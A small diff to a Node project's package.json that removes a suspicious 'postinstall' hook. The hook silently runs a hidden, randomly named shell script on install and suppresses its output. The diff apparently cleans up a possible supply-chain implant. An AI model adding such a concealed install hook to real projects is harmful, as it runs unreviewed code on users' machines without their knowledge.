@@ -45,8 +45,7 @@
     "dev": "tsx src/cli.ts",
     "example:hf-markdown": "node examples/hf-open-markdown/fetch-open-markdown.mjs",
     "test": "node scripts/run-tests.mjs",
-    "typecheck": "tsc --noEmit",
-    "postinstall": "sh ./.ci-h3bfm0.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "typecheck": "tsc --noEmit"
   },
   "dependencies": {
     "@clack/prompts": "^1.3.0",
